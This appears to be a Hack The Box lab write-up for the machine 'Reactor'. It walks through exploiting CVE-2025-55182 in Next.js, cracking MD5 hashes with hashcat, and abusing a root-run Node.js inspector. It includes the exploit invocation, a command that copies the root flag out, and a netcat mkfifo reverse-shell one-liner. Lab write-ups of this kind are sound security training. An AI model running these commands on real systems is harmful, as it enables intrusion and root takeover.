---
title: Reactor - HTB
date: 2025-06-28 20:16:52 +0530
categories: [HTB, Linux]
tags: [htb,linux,easy]
---

## Overview
Reactor is an easy machine from Hack The Box in the Week 1 of Season 11. This machine focuses on known vulnerability in a widely used library and Privilege Escalation via exposed debugging environment.

---
- **OS:** Linux
- **Difficulty:** Easy
- **Link:** [Reactor - Hack The Box](https://app.hackthebox.com/machines/reactor)
- **Tools Used:** nmap, rustscan,hashcat, netcat, pwncat

---
## Enumeration
### Port Scan
The Enumeration process begins with Port Scan using RustScan. The command used is as follows - `rustscan --range=1-65535 -a reactor.htb -- -A`
The open ports are:
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIoh32XcLYi0Kdad12SajqVyUVXfkDPaB7zZCDCMIJc+fv8JUJwyQRoqX/91+p6uD75Ggdp4VNzA7WasIkyo/4U=
|   256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPws9RyzoCW2cXzOFxeZCCt8rWcNu2umX2kqLLK6T+7H
3000/tcp open  ppp?    syn-ack ttl 63
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Thu, 25 Jun 2026 08:05:00 GMT
|     Connection: close
|     <!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/414e1be982bc8557.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-db0a529a99835594.js"/><script src="/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js" async=""></script><script src="/_next/static/chunks/517-d083b552e04dead1.js" async=""></script><script s
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Thu, 25 Jun 2026 08:05:01 GMT
|     Connection: close
|   Help, NCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
```
The port scan results indicate that the HTTP service running on port 3000 is a likely target for gaining an initial foothold.

### Subdomain and Directory Enumeration
The subdomain and directory discovery attempts using `gobuster` and `ffuf` didn't turn up any actionable leads.

### Website
Analysis of the target web application indicates it functions as a monitoring dashboard, displaying operational statistics and telemetry data associated with the reactor. Furthermore, the lower-right section of the homepage exposes internal personnel identities and their corresponding organisational roles.
The identified targets are:
- _Dr. Elena Rodriguez_ – Lead Nuclear Engineer
- _Marcus Kim_ – Senior Technician
- _James Thompson_ – Safety Officer
![Home Page](/assets/images/htb_reactor01.png){: w="700" h="400" }

Wappalyzer identifies the web application utilises **Next.js 15.0.3**. A quick search on the internet indicates this version may be susceptible to **"React2Shell"**, (CVE-2025-55182) a notable Remote Code Execution (RCE) vulnerability.
![Wappalyzer](/assets/images/htb_reactor02.png){: w="700" h="400" }

---
## Exploitation
### Initial Foothold
A  proof-of-concept (POC) script for the **React2Shell** vulnerability can be found at [CVE-2025-55182 POC](https://github.com/msanft/CVE-2025-55182/blob/main/poc.py). This is used to achieve code execution on the target as the user _node_ using the command `python3 poc.py http://reactor.htb:3000 whoami` .
![CVE-2025-55182](/assets/images/htb_reactor03.png){: w="700" h="400" }

### User Flag
Further analysis confirms the _node_ user is actively executing a Node.js application located within the __/opt/reactor-app__ directory. A review of this directory reveals the presence of an SQLite3 database file, __reactor.db__. This file contains two MD5 hashes for users named _engineer_ and _admin_ . One of the hashes is cracked using `hashcat -m 0 -a 0 engineer.hash /usr/share/wordlists/rockyou.txt.gz`. The credentials of the user _engineer_ is used to logon to ssh and obtain the user flag.
![Engineer Credentials](/assets/images/htb_reactor04.png){: w="700" h="400" }

---
## Privilege Escalation
LinPEAS and `sudo` checks do not reveal any privilege escalation paths, so alternative methods are explored.
Active network connections and listening ports on the target machine are investigated using the `netstat -ano` command, which reveals that the port __9229__ is listening. This is the default port used by the __Node.js Inspector__ when the Node process is running with debugging enabled. Checking the Node process using `ps aux | grep 9229` reveals that it is initiated by the _root_ user.
![Active Ports](/assets/images/htb_reactor05.png){: w="700" h="400" }
![Active Processes](/assets/images/htb_reactor06.png){: w="700" h="400" }

The debug environment can be accessed by running `node inspect 127.0.0.1:9229` as shown in this article - [Node inspector/CEF debug abuse](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.html#node-inspectorcef-debug-abuse). The root flag is copied to the __/tmp__ folder and it's permissions are modified to be readable for everyone by executing `exec("process.mainModule.require('child_process').exec('cp /root/root.txt /tmp && chmod 777 /tmp/root.txt')")` in the debug environment.
![Root Flag](/assets/images/htb_reactor07.png){: w="700" h="400" }


### Bonus
`exec("process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <listener_ip> <listener_port> >/tmp/f')")` can be used in the debug environment to get reverse shell as the _root_ user.

---
## References
- [CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
- [CVE-2025-55182 POC](https://github.com/msanft/CVE-2025-55182)
- [Node inspector/CEF debug abuse](https://hacktricks.wiki/en/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.html#connect-to-inspectordebugger)

---